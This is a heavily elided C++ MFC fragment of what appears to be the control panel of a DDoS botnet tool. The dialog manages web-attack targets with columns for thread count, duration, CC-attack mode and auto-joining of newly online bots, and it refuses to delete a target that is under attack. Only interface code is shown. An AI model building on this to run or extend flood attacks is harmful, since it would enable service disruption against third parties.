...
BOOL CWebAttackDlg::OnInitDialog() 
{
	...
	m_TargetList.InsertColumn(3,"线程数量",LVCFMT_LEFT,65);
	m_TargetList.InsertColumn(4,"持续时间",LVCFMT_LEFT,65);
	m_TargetList.InsertColumn(5,"模式",LVCFMT_LEFT,90);
	m_TargetList.InsertColumn(6,"轮回CC参数",LVCFMT_LEFT,78);
	m_TargetList.InsertColumn(7,"新上线自动参与",LVCFMT_LEFT,100);
	...
	for (int i=0;i<m_TargetList.GetItemCount();i++)
	{
		if(LVIS_SELECTED==m_TargetList.GetItemState(i,LVIS_SELECTED))
		{
		   ...
		   else
		   {
				...
				CPcView *m_Point=(CPcView *)ViewPoint;
...
void CWebAttackDlg::OnDeleteList() 
{
	...
	for (int i=0;i<m_TargetList.GetItemCount();i++)
	{
		if(LVIS_SELECTED==m_TargetList.GetItemState(i,LVIS_SELECTED))
		{
		   ...
		   if(str=="攻击中")
		   {
				MessageBox("报告 目标已经攻击中! 无法删除!请先停止再删除!","提示",MB_OK|MB_ICONINFORMATION);
				return;
		   }
